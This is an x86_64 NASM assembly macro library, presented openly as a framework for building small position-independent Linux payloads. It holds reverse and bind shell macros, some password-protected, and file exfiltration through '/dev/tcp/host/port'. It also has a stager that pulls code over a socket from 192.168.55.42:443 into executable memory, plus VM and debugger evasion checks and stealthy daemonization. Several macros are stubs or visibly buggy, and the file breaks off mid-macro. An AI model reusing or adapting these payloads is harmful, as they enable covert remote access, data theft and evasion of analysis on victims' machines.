
; ▀█████████▄           ▄▄▄▄███▄▄▄▄                ▄ 
;   ███ 00 ███      ▄ █ █▀▀▀███▀▀▀█ █ ▄          █ █
;   ███    ███      █ █ █fff███   █0x90          █ █ 
;  ▄███▄▄90▄██      █ █ █   ███   █ █ █          █ █ 
; ▀▀███▀▀▀██▄         █ █   ███   █ █            █0x 
;   ███0xc0██▄      █ █ █   ███   █ █ █          █ █ 
;   ███c3  ███      █ █ █   0x0fff█ █ █     █    █ █ 
; ▄█████|████▀        ▀ █   ███   | ▀       █▄▄▄▄█ █ 
;       |                         |             |
;       |                         |             |
;       |                         |             |
;       |      .                  |      .      |      .   .      .  .      . 
;       |    .   .                | * .         |  .  *     .   .     .
;       | .  .                    | .   *       |   *  .   *   .    .
; ~~~~~~~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~   ~   ~   ~  ~   - - - - - - - - - - -  -   -    -    =]D>    
;       |   .   .                 |   *  *      |  .  *   *    .
;       |      .                  |    .        |  . *  .   *     *
;       |                         |      .      |     *  .  .   *
;       |---- [Bare]              |             |      .    
;                                 |             |
;                     [Metal] ----|             |       # Framework for building small, position-independent payloads 
;                                               |
;                                               |       * Platform:         GNU/Linux
;                                               |       * Architecture:     x86_64
;          [Jacket]-----------------------------|       * Syntax:           Intel
;                                                       * Assembler:        NASM
;                                                       * MOV instructions: Just a few
;                                                       * свободная:        беларусь
;
;               / 0x01 / --- > Stack/register/string allocation helpers (variable initialization, XOR/PUSH chaining)
;               / 0x02 / --- > Auxiliary macros (stack operations, relative addressing, data types operations)           
;               / 0x03 / --- > VM/debugging detection (RDTSC, number of CPU cores, file age, clock accelleration mechanism)
;               / 0x04 / --- > Time-specific operations (time locks, timers, seeders)
;               / 0x05 / --- > Coprocessing (forking, synchronised execution, standard filesystem mutexes, daemonization)
;               / 0x06 / --- > IPC communication (signal handling/blocking/disposition/delivery)
;               / 0x07 / --- > Low-level socket operations (TCP/UDP sock initialization, port binding, listeners) 
;               / 0x08 / --- > High-level socket operations (reverse/bind shells with auth, file exfiltration)
;               / 0x09 / --- > Reverse TCP stagers (LKM/file/buffer retrieval)
;               / 0x10 / --- > Operations on files and file descriptors (reading, writing, closing, executing, mapping files)
;               / 0x11 / --- > Position-aware macros (section/relative label calculations)
;               / 0x12 / --- > Administration, environment mapping (privilleges detection/elevation, power management, crawling, process priority, shell invocation)
;               / 0x13 / --- > Command execution
;               / 0x14 / --- > Size padders (NOP sleds, pattern/byte fill)
;               / 0x15 / --- > Disablers (security measures, ASLR, process inspection)
;                < * >   --- > Experimental code (network/signal-based c2 channels, process protection, signal throwback) 
;
;
;     [::] ~ ~ ~ ~ [ _____Wintrmvte_____ @ redcodelabs.io] ~ ~ ~ ~ [::]
; 
;
;               0x61 0x76 0x65 0x20 0x76 0x78
;
;--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


%include "lib/constants.asm"
%include "lib/structs.asm"


; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x01 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> destination (register)
;
; Initializes a null char string in a given destination register
; Destination defaults to RSI
%macro push_empty_string 0-1 rsi
    xor r14, r14
    push r14
    mov %1, rsp
%endmacro

; Args -> None
;
; Clears all registers (fills with 0x00)
%macro clear_regs 0
    xor rcx, rcx
    mul rcx
%endmacro

; Args -> None
;
; Longer version of the above macro
%macro clear_regs_long 0
    multi_xor rax, rbx, rcx, rdx, rsi, rdi, r8, r9, r10, r11, r12, r13, r14, r15
%endmacro

; Args -> source (register), destination (register), shift_size (int)
;
; Shifts the source register left by shift_size bytes and moves it's contents to destination register 
%macro regpair_shift_left 3
    shl %1, %3
    or %2, %1
%endmacro

; Args -> None
;
; Transfers contents of RDX to RAX
%macro rdx_to_rax 0
    regpair_shift_left rdx, rax, 32
%endmacro

; Args -> register_1, [register_2], ... [register_N]
;
; Push multiple registers onto stack
%macro multi_push 1-*
    %rep %0
        push %1
    %endrep
%endmacro

; Args -> register_1, [register_2], ... [register_N]
;
; Pop multiple values from the stack
; Registers should be specified in the same order as in 'multi_push' macro 
%macro multi_pop 1-*
    %rep %0
    %rotate -1
        pop %1
    %endrep
%endmacro

; Args -> register_1, [register_2], ... [register_N]
;
; Initiate an arbitrary number of registers with 0x00
%macro multi_xor 1-*
    %rep %0
        xor %1, %1
    %endrep
%endmacro

; Args -> None
;
; Preserves values of all registers on the stack
%macro save_regs 0
    push rax
    push rbx
    push rcx
    push rdx
    push rdi
    push rsi
    push r9
    push r8
    push r10
    push r13
    push r15
    push r14
%endmacro

; Args -> None
;
; Restores previously stored values of all registers from the stack
%macro restore_regs 0
    pop r14
    pop r15
	pop r13
    pop r10
    pop r8
    pop r9
	pop rsi
	pop rdi
	pop rdx
	pop rcx
	pop rbx
	pop rax
%endmacro

; Args -> variable name (string), text (string)
;
; Initiates two variables: '%1' and '%1_len'
; Used mainly for initializing non-mutable buffers of fixed size that will be used later in the control flow
%macro init_string_var 2
    %define %1 '%2' 
    %strlen %1_len sometext
%endmacro

; Args -> buffer (string), destination (register)
;
; Moves a null-terminated string to desired source register
%macro init_string 2
    call %%str_stack_set
    db %2, 0x00
    %%str_stack_set:
    mov %1, [rsp]
%endmacro

; Args -> buffer (string), destination (register)
;
; Same as above, but string is loaded to source register using relative offset calculation
%macro init_string_rel 2
    %%this_string: db %2, 0x00
    lea %1, [rel %%this_string]
%endmacro

; Args -> name (string), text (string)
;
; Initiates two labels: one holding the name of the string, the other holding it's length
; The string is null-terminated
; For example, using:
;
;       init_string_len my_string, "test"
;
; one can later load previously initiated string and it's length using:
;
;       rel_load rdi, my_string
;
; In the above case, '"test", 0x00' is loaded into RDI register
%macro init_string_len 2
    %1: db %2, 0x00
    len_%2: equ $-%1
%endmacro


; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x02 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> severity, message, [output fd] (constant, string)
;
; Prints a status message to STDOUT, or to a file descriptor specified by %3
; Severity can be one of: INFO, GOOD, ERROR
%macro debug 2-3 STDOUT
	jmp %%printer
	%%msg: db %1, %2, 0x0a
    %%len: equ $-%%msg
	%%printer:
    push SYS_WRITE
    pop rax
    push STDOUT_FILENO
    pop rdi
	lea rsi, [%%msg]    
    lea rdx, [rel %%len] 
    syscall
%endmacro


; Args -> destination (register), source (label)
;
; Loads effective address of desired source label into destination register
%macro rel_load 2
    lea %1, [rel %2]
%endmacro


; Args -> bytes (int), source (register)
;
; Reserves required number of bytes in a given source register 
; Source defaults to r15
%macro reserve_stack_bytes 0-2 1024,r15
    xor rdx, rdx
    %rep 2
    push rdx
    %endrep
    sub rsp, %1
    mov %2, rsp
%endmacro

; Args -> bytes (int), source (register)
;
; Same as above, but bytes are reserved using relative offset loading of the top of the stack into source register
%macro reserve_stack_bytes_rel 0-2 1024,r15
  lea %2, [rsp-%1]        
%endmacro

; Args -> source (register), destination (register)
;
; Compares strings placed in two registers
; If they are equal, returns 0 in RAX
%macro strcmp 0-2 rax,rbx
    xor rcx, rcx
    push %2
    push rcx
    sub rsp, 8
    mov qword [rsp-8], rax
    %%check_next:
        mov rax, qword [rsp-8]
        mov al, byte [eax]
        cmp al, byte [ebx]
        jne %%not_eq
        add qword [rsp-8], 1
        inc rbx
        test al, al
        jne %%check_next
    xor eax, eax
    jmp %%end
    %%not_eq:
        xor rax, rax
        inc rax
    %%end:
        add rsp, 8
        pop rcx
        pop rbx
%endmacro

; Args -> register
;
; Converts contents inside specified register from decimal to ASCII
; The result remains in the same register
%macro dec2ascii 1
    add %1, byte '0'
%endmacro

; Args -> register
;
; Same as above, but converts from ASCII to decimal
%macro ascii2dec 1
    sub %1, byte '0'
%endmacro

; Args -> source_ip (register)
;
; Converts an IP address in 'source_ip' register (RAX by default) to hexadecimal
; Returns -i in RAX if errors occurred
%macro ip2hex 1      
    push rax
    pop rsi
    strlen
    push rax
    pop r9
    cmp     rax,15                  
    jg      %%error
    cmp     rax,7                   
    jl      %%error
    push rsi
    pop rdi
    add     rdi,r9
    push "."
    pop al
    stosb
    push rsi
    pop rdi
    xor     r8,r8                   
    push 4
    pop r12
    %%nextgroup:
    xor     rcx,rcx
    not     rcx
    push "."
    pop al
    cld
    repne   scasb
    push rcx
    pop rbx
    neg     rbx
    dec     rbx                     
    dec     rbx
    cmp     rbx,3
    jg      %%error
    cmp     rbx,1
    jl      %%error
    add     r8,rbx      
    xor     rdx,rdx
    xor     rax,rax
    %%nextbyte:
    lodsb                           
    cmp     al,"."
    je      %%done
    push rdx
    pop rbx
    shl     rbx,3
    shl     rdx,1
    add     rdx,rbx
    cmp     al,"0"
    jb      %%error
    cmp     al,"9"
    ja      %%error
    and     al,0x0F                 
    add     rdx,rax                 
    jmp     %%nextbyte
    %%done:
    cmp     rdx,0xFF                
    jg      %%error
    shl     r10,8
    or      r10,rdx
    dec     r12
    cmp     r12,0
    jne     %%nextgroup
    add     r8,3   
    cmp     r9,r8
    jne     %%error
    push r10
    pop rax
    ret
    %%error:      
    xor     rax,rax
    inc     rax
    neg     rax
%endmacro

; Args -> [source] (register)
;
; Return the length of a null-terminated string pointed to by source register
; Length is returned in RAX
; Source register defaults to RAX as well
%macro strlen 0-1 rax
    push %1
    pop rsi
    xor     rcx,rcx
    not     rcx
    xor     rax,rax
    cld
    repnz   scasb
    neg     rcx
    sub     rcx,2                   ;minus2 for trailing zero and the place behind
    push rcx
    pop rax
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x03 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> destination (label)
; 
; Returns 1 in RAX if debugging mechanism was detected
; Detection is based on simple ptrace(0, 0, 1, 0) method, so nothing new here
%macro is_debug 1
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    inc rdx
    xor rcx, rcx
    push SYS_PTRACE
    pop rax
    syscall
    cmp rax, rcx
    jne %%debugger_present
    xor rax, rax
    jmp %%finish:
    %%debugger_present
    xor rax, rax
    inc rax
    %%finish:
%endmacro

; Args -> None
;
; Detects VM environment by checking for presence of time accelleration mechanism
; Returns 1 in RAX if VM was detected; 0 otherwise
%macro vm_acc 0-1 5
    push SYS_TIME
    pop rax
    xor rdi, rdi
    syscall
    push rax
    pop r8
    sleep %1, SECONDS
    push SYS_TIME
    pop rax
    syscall
    xor rdx, rdx
    div r8
    cmp rdx, %1
    jg %%vm_detected
    xor rax, rax
    jmp %%finish
    %%vm_detected:
    push 1
    pop rax
    %%finish:
%endmacro

; Args -> minimum delay between rdtsc (int)
;
; Detects VM environment by checking for longer delay when rdtsc is issued for retrieving CPU's tick counter
; Returns 1 in RAX if VM was detected; 0 otherwise
%macro vm_tick 0-1 512
    rdtsc
    push rax
    pop rbx
    rdtsc
    sub rax, rbx
    cmp rax, %1
    jge %%vm_detected
    xor rax, rax
    jmp %%finish
    %%vm_detected:
    push 1
    pop rax
    %%finish:
%endmacro

; Args -> minimum delay between rdtsc (int)
;
; Detects VM environment by checking for low number of CPU cores
; Default trigger for positive detection is 2 cores (or less)
; Returns 1 in RAX if VM was detected; 0 otherwise
%macro vm_cpu 0-1 2
    run ""
    file_open ".numcpu"
    push rax
    pop rdi
    xor rax, rax
    push r9             
    mov rsi, rsp        
    add rdx, 1          
    syscall
    ascii2dec rsi
    xor rax, rax
    cmp rsi, %1
    jle %%vm_detected
    jmp %%finish
    %%vm_detected:
    inc rax
    %%finish:
%endmacro

; Args -> filename (string)
;
; My implementation of @elfmaster's VM detection as seen in Linux.Retaliation
; Checks for abnormally small interval between current Epoch stamp 
; and 'stx_btime' field of a file created when the host was set up  
; Such approach might trigger false positives if tested file was modified after the OS deployment
%macro vm_age 0-1 "/etc/hostname"
    push SYS_STATX
    pop rax
    xor rdi, rdi
    init_string rsi, %1
    reserve_stack_bytes_rel STATX_size, r8 
    syscall
    mov r9, [r8+STATX.stx_btime_seconds] 
%endmacro

; Args -> None
;
; Invokes all above VM detection macros and stores number of positive detections in RAX
; If any error occurred, -1 is returned in RAX 
%macro vm_all 0
    xor r12, 12
    vm_acc
    add r12, rax
    vm_tick
    add r12, rax
    vm_cpu
    add r12, rax
    cmp r12, 0
    jl %%error
    push r12
    pop rax
    %%error:
    xor rax, rax
    dec rax
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x04 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> syscall_number (int)
;
; Initiate the RAX register with system call number specified in %1 using variable instructions
;%macro scall 1 
;    mov rbx, 100
;    mov rcx, %1
;    cmp rcx, rbx
;%endmacro

; Args -> interval (int), unit, /// [reboot] (bool) ///
;
; Sets time-to-live of the program
; After given interval passes, current process receives SIGALRM via alarm(2)
; Unit argument can be any of: SECONDS, MINUTES, HOURS, DAYS
; TODO :: If 'reboot' is set to TRUE, host is rebooted instead of execution flow stop
%macro set_ttl 2-3 FALSE
    push %1
    pop rax
    push %2
    pop rdx
    mul rdx
    push rax
    pop rdi
    push SYS_ALARM
    pop rax
    syscall
    ;fork_label_parent %%cont

    ;%%cont:
%endmacro

; Args -> None
;
; Returns a random seed in RAX register
%macro init_seed 0
    rdtsc
    rdx_to_rax
    push rax
    pop r8
    xor rax, rax
    push rax
    xor rax, rax
    inc rax
    push rax
    mov rdi, rsp
    push SYS_NANOSLEEP
    pop rax
    syscall
    rdtsc
    rdx_to_rax
    div r8
    push rdx
    pop rax
%endmacro

; Args -> end_time (int)
;
; Exits if current time exceeds end_time
; The argument end_time should specify number of seconds passed since the Epoch
%macro set_deadline 1
    push SYS_TIME
    xor rdi, rdi
    pop rax
    syscall
    push %1
    pop rdx
    cmp rax, rdx
    jle %%continue 
    exit 0
    %%continue:
%endmacro

; Args -> interval (int), unit
;
; Sleeps for a given interval
; Unit argument can be one of: SECONDS, MINUTES, HOURS, DAYS
%macro sleep 2
    xor rax, rax
    push rax
    push %2
    pop rax
    push %1
    pop rdx
    mul rdx
    push rax
    mov rdi, rsp
    push SYS_NANOSLEEP
    pop rax
    syscall
%endmacro

; Args -> [fd] (register), [operation] (constant), [interval] (int), [unit] 
;
; This macro alters creation and modification times of a file specified by file descriptor
; File descriptor is provided in RDI by default
%macro stamp 0-4 rdi, FUTURE, 2, HOURS
    xchg rdi, %1
    push %3
    pop rax
    push %4
    pop rcx
    mul rcx
    push %2
    pop rbx
    cmp rbx, FUTURE
    je %%time_add

    jmp %%set_timestamp
    %%time_add:

    %%set_timestamp:
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x05 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> None
;
; Executes fork() syscall
%macro fork 0
    push SYS_FORK
    pop rax
    syscall
%endmacro


; Args -> destination (label)
;
; Same as above, but the child process jumps to label specified by 'destination'
%macro fork_label_child 1
    push SYS_FORK
    pop rax
    syscall
    xor rbx, rbx
    cmp rax, rbx
    je %1
%endmacro

; Args -> destination (label)
;
; Same as above, but the parent process jumps to label specified by 'destination'
%macro fork_label_parent 1
    push SYS_FORK
    pop rax
    syscall
    xor rbx, rbx
    cmp rax, rbx
    jne %1
%endmacro

; Args -> None
;
; Spawns a simple forkbomb
%macro forkbomb 0

%endmacro

; Args -> None
;
; Detaches current process from an interactive TTY device
%macro tty_detach 0
    push SYS_GETPGID
    pop rax
    xor rdi, rdi
    syscall
    push rax
    pop r9
    push SYS_GETPID
    pop rax
    syscall
    cmp rax, r9
    je %%sid_already_set
    push SYS_SETSID
    pop rax
    syscall
    push SYS_GETPPID
    pop rax
    syscall
    cmp rax, 1
    je %sid_already_set
    exit 0
    %%sid_already_set:
%endmacro

; Args -> number of consecutive detaches (int)
;
; Forks and performs 'tty_detach' multiple times
%macro fork_detach_exit_loop 0-1 10
    push %1
    pop rcx
    %%startloop:
    fork_label_child %%child
    exit 0
    %%child:
    tty_detach
    fork_label_child %%grandchild
    exit 0
    %%grandchild:
    loop %%startloop
%endmacro

; Args -> label, [delay] (int), [unit] (int)
;
; Executes given label in infinite loop with delay between each invocation specified in %2 and %3
; Default delay is 10 seconds
; The 'label' argument (defined elsewhere in the code) should end with a 'ret' instruction
%macro infinite_loop 1-3 10, SECONDS
    push 2
    pop rcx
    %%inf_l:
    inc rcx
    call %1
    sleep %2, %3
    loop %%inf_l
%endmacro

; Args -> destination, condition (label), [delay] (int), [unit] (int)
;
; Calls 'destination' label in an infinite loop until procedure specified in 'condition' is true 
; Condition label should end with 'ret' instruction and set RAX return value as specified below:
;   a) If RAX is set to 1 after call to 'condition' label, the loop exits
;   b) If RAX is zero or negative integer after the call, the loop continues until next iteration and calling the condition label
%macro finite_loop 2-4 10, SECONDS 
    %%loop_start:
    call %2
    push 2
    pop rcx
    cmp rax, 1
    je %%exit_loop
    call %1
    sleep %2, %3
    %%exit_loop:
%endmacro

; Args -> root_path (string), standard_path (string), loop interval (int), time unit (unit)
;
; Daemonizes current process
; Label specified as the first argument (%1) is executed infinitely in a loop  
; The loop can be broken by setting a condition label before each loop iteration in argument %4
%macro daemon_init 1-6 "/", "/usr", 0xffff, 5, MINUTES 
    fork_detach_exit_loop 1
    sig_mask_all
    push SYS_UMASK
    pop rax
    xor rdi, rdi
    syscall
    is_root
    cmp rax, 1
    je %%root_cd
    %%standard_cd:
    chdir %3
    jmp %%fd_closer
    %%root_cd:
    chdir %2
    %%fd_closer:
    close3
    infinite_loop %1, %5, %6
%endmacro

; Args -> jump_location (label), interval (int), unit 
;
; Creates a background process that passes execution to desired label after given time has passed
%macro schedule_jmp_bg 3
    fork_label_parent %%mv_forward
    sleep %2, %3
    jmp %1
    %%mv_forward:
%endmacro

; Args -> status code (int)
;
; Performs exit(2) with given code
; Default exit code is 0
%macro exit 0-1 0
    push SYS_EXIT
    pop rax
    push %1
    pop rdi
    syscall
%endmacro

; Args -> None
; 
; Waits for the child process to finish execution
%macro wait_child 0
    push SYS_WAIT
    pop rax
    xor rcx, rcx
    xor rdi, rdi
    dec rdi
    xor rsi, rsi
    syscall
%endmacro

; Args -> filename (string)
;
; Checks for existence of named mutex 
; Control flow waits until the mutex is obtained (instead of exiting).
; Can be used in a form of a global re-execution prevention mechanism.
%macro flock_block 0-1 "/tmp/.mtx"
    file_create %1
    push rax
    pop rdi
    push SYS_FLOCK
    pop rax
    push LOCK_EX
    pop rsi
    syscall
%endmacro

; Args -> filename (string)
;
; Same as the above, but if the mutex was not obtained, exec flow is passed to exit(0)
%macro flock 1
    file_create %1
    push rax
    pop rdi
    push SYS_FLOCK
    pop rax
    push LOCK_EX | LOCK_NB
    pop rsi
    syscall
    cmp rax, -1
    jne %%continue
    exit 0
    %%continue:
%endmacro

; Args -> filename (string)
;
; Creates a persistent file lock via O_CREAT
; If it cannot be obtained, the program exits
%macro plock 1
    file_open %1
    xor rcx, rcx
    dec rcx
    cmp rax, rcx
    jne %%cnt
    exit 0
    %%cnt:
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x06 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 


; Args -> [pid] (int)
;
; Kills process specified by pid
; By default, every process that can receive SIGKILL from current process is killed
%macro kill 0-1 -1
    push SYS_KILL
    pop rax
    push %1
    pop rdi
    push SIGKILL
    pop rsi
    syscall
%endmacro

; Args -> None
;
; Sends SIGKILL to parent process
%macro kill_parent 0 
    push SYS_GETPPID
    pop rax
    syscall
    push rax
    pop rdi
    kill rdi
%endmacro

; Args -> [pid] (int)
;
; Sends desired signal to a process specified by 'pid'
; Signal should be placed in r8 register
; By default, every process that can receive SIGKILL from current process is killed
%macro sig 0-1 -1
    push SYS_KILL
    pop rax
    push %1
    pop rdi
    push r8
    pop rsi
    syscall
%endmacro

; Args -> pid_1, [pid_2] ... [pid_N] (int)
;
; Same as above, but multiple processes can be specified
%macro sig_multi 1-*
    %rep %0
    kill %1
    %endrep
%endmacro


; Args -> None
;
; Sends SIGTRAP to current process and it's parent
%macro self_sigtrap 0 
    push SYS_GETPID
    pop rax
    syscall
    push rax
    pop rdi
    push SIGTRAP
    pop rsi
    syscall
    push SYS_GETPPID
    pop rax
    syscall
    push rax
    pop rdi
    push SYS_KILL
    pop rax
    push SIGTRAP
    pop rsi
    syscall
%endmacro

; Args -> signum_1, [signum_2] ... , [signum_N]
;
; Block specific signal numbers
%macro sig_mask 1-*
    %rep %0
        push SYS_RT_SIGPROCMASK
        pop rax
        push %1
        pop rsi
        push SIG_BLOCK
        pop rdi
        xor rdx, rdx
        push 8
        pop r10
        syscall
    %endrep
%endmacro

; Args -> None
;
; Block all 32 signals
%macro sig_mask_all 0
    push 32
    pop rcx
    %%sig_num_load_loop: 
        sig_mask rcx
        loop %%sig_num_load_loop
%endmacro

; Args -> None
;
; Block common signals
%macro sig_mask_common 0

%endmacro

; Args -> None
;
; Unblock previously blocked common signals
%macro sig_unmask_common 0

%endmacro

; Args -> None
;
; Block all 64 signals
%macro sig_mask_64 0
    push 64
    pop rcx
    %%sig_num_load_loop: 
        sig_mask rcx
        loop %%sig_num_load_loop
%endmacro

%macro sig_unmask 1-*
    %rep %0
        push SYS_RT_SIGPROCMASK
        pop rax
        push %1
        pop rsi
        push SIG_UNBLOCK
        pop rdi
        xor rdx, rdx
        push 8
        pop r10
        syscall
    %endrep
%endmacro

%macro sig_unmask_all 0
    push 32
    pop rcx
    %%sig_num_load_loop: 
        sig_unmask rcx
        loop %%sig_num_load_loop
%endmacro

%macro sig_unmask_64 0
    push 64
    pop rcx
    %%sig_num_load_loop: 
        sig_unmask rcx
        loop %%sig_num_load_loop
%endmacro

; Args -> None
;
; Causes a hangup of current user's TTY device
%macro terminal_hangup 0
    is_root
    cmp rax, 1
    je %%hng
    jmp %%mv_forward:
    %%hng:
    push SYS_VHANGUP
    pop rax
    syscall
    %%mv_forward:
%endmacro


; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x07 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> None
;
; Initiates a TCP socket in a new file descriptor, which is returned in RAX
%macro init_sock_tcp 0
    push SYS_SOCKET
    pop rax         
    push AF_INET
    pop rdi         
    push SOCK_STREAM
    pop rsi         
    xor rdx, rdx    
    syscall         
%endmacro

; Args -> None
;
; Initiates an UDP socket in a new file descriptor, which is returned in RAX
%macro init_sock_udp 0
    push SYS_SOCKET
    pop rax         
    push AF_INET
    pop rdi         
    push SOCK_DGRAM
    pop rsi         
    xor rdx, rdx
    syscall         
%endmacro

; Args -> None
;
; Performs bind() on already initiated socket file descriptor
; The fd should be passed in RAX
%macro sock_bind 0-1 5555
    xor r9, r9
    push 16
    pop rdx
    push rax
    pop rdi
    push SYS_BIND 
    pop rax
    push r9 ; x 1 ?
    push r9
    push word %1
    push word AF_INET
    mov rsi, rsp
    syscall
%endmacro

; Args -> port (int)
;
; Performs a consecutive calls of bind(), listen() and accept() on a socket file descriptor given in RAX
%macro sock_bind_listen_accept 0-1 4444
    sock_bind %1
    cmp rax, -1
    je %%continue_on_error
    push SYS_LISTEN
    pop rax
    xor rsi, rsi
    syscall
    cmp rax, -1
    je %%continue_on_error
    fork_label_parent %%continue_on_error
    push SYS_ACCEPT
    pop rax
    xor rdx, rdx
    syscall
    %%continue_on_error:
%endmacro

; Args -> IP (string), port (int)
;
; Establishes a TCP connection with desired host
; Socket file descriptor is passed in RAX by default
%macro sock_connect 2-3 rax 
    xchg rdi, rax                
    push %1
    pop rax
    ip2hex
    push rax
    pop r10
    push rdi
    pop rbx
    mov dword [rsp-4], r10 
    mov word  [rsp-6], %2    
    mov byte  [rsp-8], 0x02      
    sub rsp, 8                   
    push SYS_CONNECT
    pop rax                      
    mov rsi, rsp                 
    push 16
    pop rdx                      
    syscall                      
%endmacro

; Args -> IP (string), port (int)
;
; Alternative version of the above macro
; Credits for @netspooky
%macro sock_connect2 2 
    push rax
    pop rdi 
    xor r9, r9
    push SYS_CONNECT
    pop rax             
    push r9             
    push %1     
    push word %2    
    push word 2         
    mov rsi, rsp        
    add rdx, 16         
    syscall             
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x08 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> host (ip string), port (int)
;
; Spawns a basic reverse shell 
%macro revshell 2
    fork_label_parent %%continue
    init_sock_tcp
    sock_connect %1, %2
    push rax
    pop rdi
    dup2_std
    spawn_sh
    %%continue:
%endmacro

; Args -> host (ip string), port (int), [password] (8-byte string)
;
; Spawns a reverse shell with default password "FFFF"
%macro revshell_password 2-3 "FFFF"
    fork_label_parent %%continue
    init_sock_tcp
    sock_connect %1, %2 
    push rax
    pop rdi
    dup2_std
    push SYS_READ
    pop rax
    reserve_stack_bytes_rel 8, rsi
    add rdx, 8          ; read 8 bytes
    syscall
    cmp rax, -1
    je %%continue 
    %%pwd: db %3
    rel_load rax, %%pwd
    push rsi
    pop rdi
    scasq               ; compares RAX and [RDI]
    jne %%continue            
    spawn_sh
    %%continue:
%endmacro

; Args -> port (int)
;
; Spawns a basic bind shell
%macro bindshell 2
    init_sock_tcp
    sock_bind_listen_accept
    dup2_std
    spawn_sh
%endmacro

; Args -> port (int), password (8-byte string)
;
; Spawns bind shell with a password
%macro bindshell_password 2
    init_sock_tcp
    sock_bind_listen_accept
    dup2_std
    push SYS_READ
    pop rax
    reserve_stack_bytes_rel 8, rsi
    add rdx, 8          ; read 8 bytes
    syscall
    cmp rax, -1
    je %%continue 
    %%pwd: db %3
    rel_load rax, %%pwd
    push rsi
    pop rdi
    scasq               ; compares RAX and [RDI]
    jne %%continue            
    spawn_sh
    %%continue:
%endmacro

; Args -> host (string), port (int)
%macro file_exfil 2
    run "echo %3 > /dev/tcp/%1/%2"
%endmacro

; Args -> host (string), port (int)
%macro file_exfil_multi 2
    run "echo %3 > /dev/tcp/%1/%2"
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x09 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> [filename] (string), [use_huge_pages] (bool)
;
; Create a file in memory via memfd_create(2)
; New file descriptor is returned in RAX
%macro memfd_create 0-2 0xfee1d33d, FALSE 
    call %%dr
    db %1, 0x00
    %%dr:
    mov r9, rsp
    push %2
    pop r8
    cmp r8, FALSE
    je %%use_standard_table_size
    push MFD_HUGETLB
    pop rsi
    %%use_standard_table_size:
    xor rsi, rsi ; ?
    push SYS_MEMFD_CREATE
    pop rax
    push r9
    pop rdi
    syscall
%endmacro

; Args -> host (hex), port (hex) 
;
; Loads a file (preferrably an executable) in memory via socket(2) and memfd_create(2)
; Returns the fd of the loaded file in RAX and R9, or -ERRNO in RAX on either socket failure or file creation error
%macro fd_load_remote 2
    init_sock_tcp
    push rax
    pop r11
    sock_connect %1, %2
    memfd_create
    push rax
    pop r12
    fd2fd
    push rax
    pop r9
%endmacro

%macro heap_buff 0-1 r11

%endmacro

%macro exec_heap_buff 0-1 r11

%endmacro

%macro exec_buff 0
    push SYS_BRK
    pop rax
    xor rdi, rdi
    syscall
    push SYS_BRK
    pop rax
    push 4096
    pop rdi
    syscall
    ;push rax
    ;pop rcx
        
    ; :TODO: MMAP HERE


    syscall                         ;// mmap(addr, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, -1, 0)
    mov r9, rax                     ;// save heap address in r9

    ;// ===================>
    ;// SOCKET CONNECTION =>
    ;// ===================>
    xor rax, rax
    mov al, 41                      ;// int socket()
    xor rdi, rdi
    inc rdi
    inc rdi                         ;// AF_INET
    xor rsi, rsi
    inc rsi                         ;// SOCK_STREAM
    xor rdx, rdx
    mov dl, 6                       ;// IPPROTO_TCP
    syscall                         ;// socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    push rax
    pop rdi                         ;// save the socket's fd in rdi for connect() to use

    xor rax, rax
    push rax
    mov dword [rsp-4], 0x2a37a8c0   ;// 192.168.55.42
    mov word [rsp-6], 0xbb01        ;// port 443 in lil' endian
    sub rsp, 6
    push word 0x2

    xor rax, rax
    mov al, 42                      ;// int connect()
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    syscall                         ;// connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("192.168.55.42")}, 16)

    ;// ====================================>
    ;// READ CODE FROM SOCKET FD INTO HEAP =>
    ;// ====================================>
    mov rsi, r9                     ;// heap addr still saved in r9
    xor rdx, rdx
    mov dl, 41                      ;// CHANGE THIS NUMBER TO SUIT THE SIZE OF YOUR PAYLOAD (41-byte payload used in testing)
    xor rax, rax
    syscall                         ;// read(3, heap_addr, SIZE)

    ;// =================>
    ;// CLOSE SOCKET FD =>
